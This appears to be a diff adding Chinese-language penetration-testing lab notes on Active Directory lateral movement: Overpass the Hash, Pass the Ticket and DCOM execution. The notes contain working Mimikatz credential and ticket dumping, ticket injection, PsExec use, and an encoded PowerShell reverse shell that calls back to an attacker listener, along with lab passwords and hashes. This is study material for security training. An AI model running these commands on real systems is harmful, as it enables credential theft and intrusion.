@@ -309,3 +309,400 @@ files04\administrator
 在 CLIENT74 上執行 PtH 攻擊 FILES04，透過 Pivoting（樞紐攻擊） 進一步擴展控制權限。
 
 ### Overpass the Hash
+Overpass the Hash（PtK）是進階的 Pass the Hash（PtH）變種攻擊，可以 將 NTLM hash 轉換成 Kerberos ticket，並利用 Kerberos 驗證來執行遠端命令，達成 Lateral Movement。
+- PtH 直接使用 NTLM Hash 驗證 SMB（TCP 445）等 NTLM 服務。
+- PtK 將 NTLM Hash 轉換為 Kerberos [Ticket Granting Ticket](https://learn.microsoft.com/en-us/windows/win32/secauthn/ticket-granting-tickets) （TGT），利用 TGT 存取 [Ticket Granting Service](https://learn.microsoft.com/en-us/windows/win32/secauthn/ticket-granting-service-exchange) (TGS)，Kerberos 服務如：
+    - CIFS（檔案共享）
+    - RDP（遠端桌面）
+    - LDAP（用於 Active Directory 存取）
+    - PsExec（遠端執行命令）
+
+>[!Note]
+> Overpass the Hash 條件：
+> 1. 已經取得 NTLM Hash
+> 2. 目標使用者（如 `jen`）已經登入某台機器
+> 3. 網路上有可用的 Kerberos 服務（如 Active Directory）
+
+#### 1. 取得目標使用者的 NTLM Hash
+```
+┌──(chw㉿CHW)-[~]
+└─$ xfreerdp /cert-ignore /u:jeff /d:corp.com /p:HenchmanPutridBonbon11 /v:192.168.170.76
+```
+以 `jeff` 在 CLIENT76 上執行 Mimikatz 來提取 jen 的 NTLM Hash
+```
+PS C:\Windows\system32> cd C:\Tools\
+PS C:\Tools> .\mimikatz.exe
+
+  .#####.   mimikatz 2.2.0 (x64) #19041 Aug 10 2021 17:19:53
+ .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
+ ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
+ ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
+ '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
+  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/
+
+mimikatz # privilege::debug
+Privilege '20' OK
+
+mimikatz # sekurlsa::logonpasswords
+...
+Authentication Id : 0 ; 1142030 (00000000:00116d0e)
+Session           : Interactive from 0
+User Name         : jen
+Domain            : CORP
+Logon Server      : DC1
+Logon Time        : 2/27/2023 7:43:20 AM
+SID               : S-1-5-21-1987370270-658905905-1781884369-1124
+        msv :
+         [00000003] Primary
+         * Username : jen
+         * Domain   : CORP
+         * NTLM     : 369def79d8372408bf6e93364cc93075
+         * SHA1     : faf35992ad0df4fc418af543e5f4cb08210830d4
+         * DPAPI    : ed6686fedb60840cd49b5286a7c08fa4
+        tspkg :
+        wdigest :
+         * Username : jen
+         * Domain   : CORP
+         * Password : (null)
+        kerberos :
+         * Username : jen
+         * Domain   : CORP.COM
+         * Password : (null)
+        ssp :
+        credman :
+...
+```
+#### 2. 使用 Mimikatz 進行 Overpass the Hash
+使用 Mimikatz 的 `sekurlsa::pth` 建立一個新的 PowerShell process，這個 process 將使用 jen 的 NTLM hash 來模擬其身份，並取得 Kerberos ticket：
+```
+mimikatz # sekurlsa::pth /user:jen /domain:corp.com /ntlm:369def79d8372408bf6e93364cc93075 /run:powershell
+user    : jen
+domain  : corp.com
+program : powershell
+impers. : no
+NTLM    : 369def79d8372408bf6e93364cc93075
+  |  PID  8072
+  |  TID  8136
+  |  LSA Process is now R/W
+  |  LUID 0 ; 2389572 (00000000:00247644)
+  \_ msv1_0   - data copy @ 000001B80515E000 : OK !
+  \_ kerberos - data copy @ 000001B8051BE228
+   \_ aes256_hmac       -> null
+   \_ aes128_hmac       -> null
+   \_ rc4_hmac_nt       OK
+   \_ rc4_hmac_old      OK
+   \_ rc4_md4           OK
+   \_ rc4_hmac_nt_exp   OK
+   \_ rc4_hmac_old_exp  OK
+   \_ *Password replace @ 000001B8051C73E8 (32) -> null
+```
+會出現新的 PowerShell session\
+![image](https://hackmd.io/_uploads/HJiQgxl31g.png)
+> 輸入 `whoami` 為什麼還是 `jeff`?!
+
+>[!Important]
+>At this point, running the whoami command on the newly created PowerShell session would show jeff's identity instead of jen. While this could be confusing, this is the intended `behavior of the whoami` utility which only `checks the current process's token` and `does not inspect any imported Kerberos tickets`
+
+#### 3. 觸發 Kerberos（TGT）& `klist` 檢查利用 ticket
+`klist` 用於檢查目前系統 Cache 的 Kerberos ticket（TGT, TGS)。\
+使用 `net use` 存取 FILES04 Server，讓 Windows 向 AD 請求一張 Kerberos ticket，以驗證 jen。
+```
+PS C:\Windows\system32> klist
+
+Current LogonId is 0:0x264151
+
+Cached Tickets: (0)
+PS C:\Windows\system32> net use \\files04
+The command completed successfully.
+
+PS C:\Windows\system32> klist
+
+Current LogonId is 0:0x264151
+
+Cached Tickets: (2)
+
+#0>     Client: jen @ CORP.COM
+        Server: krbtgt/CORP.COM @ CORP.COM
+        KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96
+        Ticket Flags 0x40e10000 -> forwardable renewable initial pre_authent name_canonicalize
+        Start Time: 3/13/2025 1:33:47 (local)
+        End Time:   3/13/2025 11:33:47 (local)
+        Renew Time: 3/20/2025 1:33:47 (local)
+        Session Key Type: RSADSI RC4-HMAC(NT)
+        Cache Flags: 0x1 -> PRIMARY
+        Kdc Called: DC1.corp.com
+
+#1>     Client: jen @ CORP.COM
+        Server: cifs/files04 @ CORP.COM
+        KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96
+        Ticket Flags 0x40a10000 -> forwardable renewable pre_authent name_canonicalize
+        Start Time: 3/13/2025 1:33:47 (local)
+        End Time:   3/13/2025 11:33:47 (local)
+        Renew Time: 3/20/2025 1:33:47 (local)
+        Session Key Type: AES-256-CTS-HMAC-SHA1-96
+        Cache Flags: 0
+        Kdc Called: DC1.corp.com
+```
+> `Ticket #0` : TGT（Ticket Granting Ticket）\
+`Ticket #1`: TGS（Ticket Granting Service），用於存取 FILES04 的 CIFS（檔案共享服務）。
+
+#### 4. 使用 Kerberos ticket 存取目標機器
+使用 [PsExec](#PsExec) 來執行遠端命令，因為它依賴 Kerberos 來驗證
+```
+PS C:\Windows\system32> cd C:\tools\SysinternalsSuite\
+PS C:\tools\SysinternalsSuite> .\PsExec.exe \\files04 cmd
+
+PsExec v2.4 - Execute processes remotely
+Copyright (C) 2001-2022 Mark Russinovich
+Sysinternals - www.sysinternals.com
+
+
+Microsoft Windows [Version 10.0.20348.169]
+(c) Microsoft Corporation. All rights reserved.
+
+C:\Windows\system32>whoami
+corp\jen
+
+C:\Windows\system32>hostname
+FILES04
+```
+
+>[!Important]
+>**Overpass the Hash（PtK） VS Pass the Hash（PtH）**\
+>![image](https://hackmd.io/_uploads/B1yFXxg3ye.png)
+
+### Pass the Ticket
+Pass the Ticket（PtT） 利用已獲取的 Kerberos service ticket（TGS）存取受保護資源，與 Overpass the Hash（PtK） 最大的不同：
+- PtK 透過 NTLM Hash 來請求新的 Kerberos TGT，然後存取服務
+- PtT 直接使用已存在的 TGS，無需進行 NTLM 認證或請求新的 TGT
+
+PtT 可以繞過 NTLM，但只限使用 Kerberos 驗證來存取目標資源
+
+>[!Note]
+>Pass the Ticket 滿足條件：
+>- 目標使用者（如 dave）已經在系統上登入，並且產生了 Kerberos service ticket（TGS）。
+>- 擁有 SYSTEM 權限，能夠存取 LSASS 來提取 ticket（例如透過 Mimikatz）。
+>- 可以將提取的 TGS 重新注入到自己的 session 中，從而模擬目標使用者。
+
+[範例環境]\
+
+使用 `jen` 嘗試存取 WEB04 伺服器，將濫用 dave 的現有 session。dave 有權存取位於 WEB04 上的備份資料夾，而我們的登入使用者jen沒有。
+#### 1. 確認目前使用者無法存取受限資源
+```
+┌──(chw㉿CHW)-[~]
+└─$ xfreerdp /cert-ignore /u:jen  /p:Nexus123! /v:192.168.170.74
+```
+```
+PS C:\Users\jen\Desktop> whoami
+corp\jen
+PS C:\Users\jen\Desktop> ls \\web04\backup
+ls : Access is denied
+At line:1 char:1
++ ls \\web04\backup
+...
+```
+> 表示 jen 沒有權限存取 backup 共享資料夾
+
+#### 2. 提取當前記憶體中的 Kerberos ticket
+使用 Mimikatz 來匯出系統記憶體中所有的 Kerberos TGT/TGS:
+```
+PS C:\Windows\system32> cd C:\Tools\
+PS C:\Tools> .\mimikatz.exe
+
+  .#####.   mimikatz 2.2.0 (x64) #19041 Aug 10 2021 17:19:53
+ .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
+ ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
+ ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
+ '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
+  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/
+
+mimikatz # privilege::debug
+Privilege '20' OK
+
+mimikatz # sekurlsa::tickets /export
+
+Authentication Id : 0 ; 9257415 (00000000:008d41c7)
+Session           : Interactive from 0
+User Name         : dave
+Domain            : CORP
+Logon Server      : DC1
+Logon Time        : 3/13/2025 12:01:41 AM
+SID               : S-1-5-21-1987370270-658905905-1781884369-1103
+
+         * Username : dave
+         * Domain   : CORP.COM
+         * Password : (null)
+
+        Group 0 - Ticket Granting Service
+
+        Group 1 - Client Ticket ?
+
+        Group 2 - Ticket Granting Ticket
+         [00000000]
+           Start/End/MaxRenew: 3/13/2025 12:01:41 AM ; 3/13/2025 10:01:41 AM ; 3/20/2025 12:01:41 AM
+           Service Name (02) : krbtgt ; CORP.COM ; @ CORP.COM
+           Target Name  (02) : krbtgt ; corp ; @ CORP.COM
+           Client Name  (01) : dave ; @ CORP.COM ( corp )
+           Flags 40c10000    : name_canonicalize ; initial ; renewable ; forwardable ;
+           Session Key       : 0x00000001 - des_cbc_crc
+             c69b596b7721c388ce399eb8361c41de4a529e56b582288c9b7987862a430ee7
+           Ticket            : 0x00000012 - aes256_hmac       ; kvno = 2        [...]
+           * Saved to file [0;8d41c7]-2-0-40c10000-dave@krbtgt-CORP.COM.kirbi !
+```
+>已成功匯出記憶體中 [LSASS](https://learn.microsoft.com/en-us/windows-server/security/credentials-protection-and-management/configuring-additional-lsa-protection)  process 空間中的 TGT/TGS，匯出成 `.kirbi` 檔案
+
+利用 `dir *.kirbi` 檢查匯出的 TGT 與 TGS
+```
+PS C:\Tools> dir *.kirbi
+
+    Directory: C:\Tools
+
+Mode                 LastWriteTime         Length Name
+----                 -------------         ------ ----
+-a----         3/12/2025  11:50 PM           1567 [0;2be743]-0-0-40a10000-jen@cifs-web04.kirbi
+...
+-a----         3/13/2025  12:17 AM           1563 [0;3e7]-2-1-40e10000-CLIENT74$@krbtgt-CORP.COM.kirbi
+-a----         3/13/2025  12:17 AM           1521 [0;8d41c7]-2-0-40c10000-dave@krbtgt-CORP.COM.kirbi
+-a----         3/13/2025  12:17 AM           1577 [0;8d4217]-0-0-40810000-dave@cifs-web04.kirbi
+-a----         3/13/2025  12:17 AM           1611 [0;8d4217]-0-1-40850000-dave@LDAP-DC1.corp.com.kirbi
+-a----         3/13/2025  12:17 AM           1521 [0;8d4217]-2-0-40c10000-dave@krbtgt-CORP.COM.kirbi
+```
+
+#### 3. 在 session 中注入 ticket
+選擇 `dave@cifs-web04.kirbi` 格式的任何 TGS 票證，並透過`kerberos::ptt` 指令將其註入 mimikatz 
+
+>[!Tip]
+>dave 相關的 `*.kirbi` 有：\
+>`[0;8d41c7]-2-0-40c10000-dave@krbtgt-CORP.COM.kirbi`\
+`[0;8d4217]-0-0-40810000-dave@cifs-web04.kirbi`\
+`[0;8d4217]-0-1-40850000-dave@LDAP-DC1.corp.com.kirbi`\
+>>為什麼選擇 `[0;8d4217]-0-0-40810000-dave@cifs-web04.kirbi` ?而不是其他 kirbi ticket?\
+>>Ans: 現在要利用 TGS 存取 CIFS
+>>- dave@krbtgt-CORP.COM.kirbi（TGT）
+>>❌ 這是 TGT，只能用來請求 TGS，不能直接存取 WEB04。
+>>❌ 如果要使用 TGT，還需要額外請求 TGS，這可能會被 SIEM 監控到。
+>>- dave@LDAP-DC1.corp.com.kirbi（TGS）
+❌ 這個 TGS 票證適用於 LDAP 服務，而不是 CIFS 檔案共享。
+❌ 即使注入這個票證，也無法存取 WEB04。
+
+將 dave 在 WEB04 的 TGS ticket 注入到 jen 的 session
+```
+mimikatz # kerberos::ptt [0;8d4217]-0-0-40810000-dave@cifs-web04.kirbi
+
+* File: '[0;8d4217]-0-0-40810000-dave@cifs-web04.kirbi': OK
+```
+
+#### 4. 驗證票證是否成功注入
+`klist` 檢查當前 session 中的 Kerberos ticket
+```
+PS C:\Tools> klist
+
+Current LogonId is 0:0x2be743
+
+Cached Tickets: (1)
+
+#0>     Client: dave @ CORP.COM
+        Server: cifs/web04 @ CORP.COM
+        KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96
+        Ticket Flags 0x40810000 -> forwardable renewable name_canonicalize
+        Start Time: 3/13/2025 0:02:47 (local)
+        End Time:   3/13/2025 10:01:41 (local)
+        Renew Time: 3/20/2025 0:01:41 (local)
+        Session Key Type: Kerberos DES-CBC-CRC
+        Cache Flags: 0
+        Kdc Called:
+```
+
+#### 5. 嘗試存取目標
+```
+PS C:\Tools> ls \\web04\backup
+
+    Directory: \\web04\backup
+
+Mode                 LastWriteTime         Length Name
+----                 -------------         ------ ----
+-a----         9/13/2022   2:52 AM              0 backup_schemata.txt
+-a----         3/12/2025  10:58 PM             78 flag.txt
+```
+> 成功偽裝成 dave，並存取 WEB04\backup 共享資料夾
+
+>[!Important]
+>**Pass the Hash（PtH vs.Pass the Ticket（PtT） vs. Overpass the Hash（PtK)**\
+>![image](https://hackmd.io/_uploads/rkPhfMe2Je.png)
+
+### DCOM
+>[!Note]
+>**COM 與 DCOM**
+>- COM（[Component Object Model](https://msdn.microsoft.com/en-us/library/windows/desktop/ms680573(v=vs.85).aspx)）: 是
+>Microsoft 開發的一種技術，用於讓應用程式內部的不同元件互相溝通，最早用於 同一台機器上的應用程式交互。
+>- DCOM（[Distributed Component Object Model](https://msdn.microsoft.com/en-us/library/cc226801.aspx)）:
+> COM 的延伸，允許不同電腦透過網路進行 COM 物件的交互，這讓應用程式可以透過 RPC（遠端程序呼叫） 在多台機器間運行。
+
+DCOM 透過 RPC（TCP 135）進行通訊，需要本機管理員權限才能存取 DCOM Service Control Manager (SCM)，本質上是一個 API
+
+DCOM 橫向移動是基於用於 Windows 系統腳本自動化的 [Microsoft Management Console](https://docs.microsoft.com/en-us/previous-versions/windows/desktop/mmc/microsoft-management-console-start-page)(MMC) COM 應用程式。\
+MMC 應用程式類別允許建立  [Application Objects](https://docs.microsoft.com/en-us/previous-versions/windows/desktop/mmc/application-object?redirectedfrom=MSDN)，該對象公開 Document.ActiveView 屬性下的 ExecuteShellCommand method。這是 local administrators 的預設設定，允許經過身份驗證的使用者在獲得授權後執行任何 shell 命令，。
+
+>[!Important]
+利用 MMC20.Application.1 這個 COM Object 來遠端執行命令：\
+透過 ExecuteShellCommand 可執行 cmd.exe 或 PowerShell 指令。
+
+[情境範例]
+- 目前已經掌控 CLIENT74（Windows 11），並以 jen 身份登入。
+- 目標機器是 FILES04（IP: 192.168.170.73）。
+- 目標機器上啟用了 DCOM，且 jen 具有管理員權限。
+
+#### 1. 透過 PowerShell 遠端建立 DCOM Object
+```
+┌──(chw㉿CHW)-[~]
+└─$ xfreerdp /cert-ignore /u:jen  /p:Nexus123! /v:192.168.170.74
+```
+在 CLIENT74 上開啟 Administrator 的 PowerShell，建立了一個遠端的 MMC 2.0 Application Object
+```
+PS C:\Windows\system32> $dcom = [System.Activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application.1","192.168.170.73"))
+```
+> `"MMC20.Application.1"`: MMC 應用的 ProgID\
+`"192.168.50.73"`: 目標機器 FILES04 的 IP
+#### 2. 透過 DCOM 遠端執行 cmd.exe
+```
+PS C:\Windows\system32> $dcom.Document.ActiveView.ExecuteShellCommand("cmd",$null,"/c calc","7")
+```
+> `"cmd"`：執行 cmd.exe\
+`/c calc`：指示 cmd.exe 執行 calc\
+`"7"`：控制視窗狀態，7 代表最小化執行\
+>>FILES04 會在 Session 0 啟動 calc.exe，但因為是服務模式，無法直接在桌面上看到
+
+可在 FILES04 上檢查是否成功
+```
+C:\Users\Administrator>tasklist | findstr "calc"
+win32calc.exe                 4764 Services                   0     12,132 K
+```
+#### 3. 使用 DCOM 執行 Reverse Shell
+產生 Base64 編碼的 PowerShell Reverse Shell payload
+```
+┌──(chw㉿CHW)-[~/Tools]
+└─$ python3 WMI_reverseshell.py
+powershell -nop -w hidden -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5ADIALgAxADYAOAAuADQANQAuADEAOAA1ACIALAA4ADgAOAA4ACkAOwAkAHMAdAByAGUAYQBtACAAPQAgACQAYwBsAGkAZQBuAHQALgBHAGUAdABTAHQAcgBlAGEAbQAoACkAOwBbAGIAeQB0AGUAWwBdAF0AJABiAHkAdABlAHMAIAA9ACAAMAAuAC4ANgA1ADUAMwA1AHwAJQB7ADAAfQA7AHcAaABpAGwAZQAoACgAJABpACAAPQAgACQAcwB0AHIAZQBhAG0ALgBSAGUAYQBkACgAJABiAHkAdABlAHMALAAgADAALAAgACQAYgB5AHQAZQBzAC4ATABlAG4AZwB0AGgAKQApACAALQBuAGUAIAAwACkAewA7ACQAZABhAHQAYQAgAD0AIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAtAFQAeQBwAGUATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEEAUwBDAEkASQBFAG4AYwBvAGQAaQBuAGcAKQAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABiAHkAdABlAHMALAAwACwAIAAkAGkAKQA7ACQAcwBlAG4AZABiAGEAYwBrACAAPQAgACgAaQBlAHgAIAAkAGQAYQB0AGEAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcAIAApADsAJABzAGUAbgBkAGIAYQBjAGsAMgAgAD0AIAAkAHMAZQBuAGQAYgBhAGMAawAgACsAIAAiAFAAUwAgACIAIAArACAAKABwAHcAZAApAC4AUABhAHQAaAAgACsAIAAiAD4AIAAiADsAJABzAGUAbgBkAGIAeQB0AGUAIAA9ACAAKABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAAkAHMAZQBuAGQAYgBhAGMAawAyACkAOwAkAHMAdAByAGUAYQBtAC4AVwByAGkAdABlACgAJABzAGUAbgBkAGIAeQB0AGUALAAwACwAJABzAGUAbgBkAGIAeQB0AGUALgBMAGUAbgBnAHQAaAApADsAJABzAHQAcgBlAGEAbQAuAEYAbAB1AHMAaAAoACkAfQA7ACQAYwBsAGkAZQBuAHQALgBDAGwAbwBzAGUAKAApAA==
+
+```
+DCOM 執行
+```
+PS C:\Windows\system32> $dcom.Document.ActiveView.ExecuteShellCommand("powershell",$null,"powershell -nop -w hidden -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5ADIALgAxADYAOAAuADQANQAuADEAOAA1ACIALAA4ADgAOAA4ACkAOwAkAHMAdAByAGUAYQBtACAAPQAgACQAYwBsAGkAZQBuAHQALgBHAGUAdABTAHQAcgBlAGEAbQAoACkAOwBbAGIAeQB0AGUAWwBdAF0AJABiAHkAdABlAHMAIAA9ACAAMAAuAC4ANgA1ADUAMwA1AHwAJQB7ADAAfQA7AHcAaABpAGwAZQAoACgAJABpACAAPQAgACQAcwB0AHIAZQBhAG0ALgBSAGUAYQBkACgAJABiAHkAdABlAHMALAAgADAALAAgACQAYgB5AHQAZQBzAC4ATABlAG4AZwB0AGgAKQApACAALQBuAGUAIAAwACkAewA7ACQAZABhAHQAYQAgAD0AIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAtAFQAeQBwAGUATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEEAUwBDAEkASQBFAG4AYwBvAGQAaQBuAGcAKQAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABiAHkAdABlAHMALAAwACwAIAAkAGkAKQA7ACQAcwBlAG4AZABiAGEAYwBrACAAPQAgACgAaQBlAHgAIAAkAGQAYQB0AGEAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcAIAApADsAJABzAGUAbgBkAGIAYQBjAGsAMgAgAD0AIAAkAHMAZQBuAGQAYgBhAGMAawAgACsAIAAiAFAAUwAgACIAIAArACAAKABwAHcAZAApAC4AUABhAHQAaAAgACsAIAAiAD4AIAAiADsAJABzAGUAbgBkAGIAeQB0AGUAIAA9ACAAKABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAAkAHMAZQBuAGQAYgBhAGMAawAyACkAOwAkAHMAdAByAGUAYQBtAC4AVwByAGkAdABlACgAJABzAGUAbgBkAGIAeQB0AGUALAAwACwAJABzAGUAbgBkAGIAeQB0AGUALgBMAGUAbgBnAHQAaAApADsAJABzAHQAcgBlAGEAbQAuAEYAbAB1AHMAaAAoACkAfQA7ACQAYwBsAGkAZQBuAHQALgBDAGwAbwBzAGUAKAApAA==","7")
+```
+(Kali)
+```
+┌──(chw㉿CHW)-[~/Tools]
+└─$ nc -nvlp 8888                      
+listening on [any] 8888 ...
+connect to [192.168.45.185] from (UNKNOWN) [192.168.170.73] 65097
+
+PS C:\Windows\system32> whoami
+corp\jen
+PS C:\Windows\system32> hostname
+FILES04
+
+PS C:\Windows\system32> 
+
+```
+## Active Directory Persistence
+### Overpass the Hash
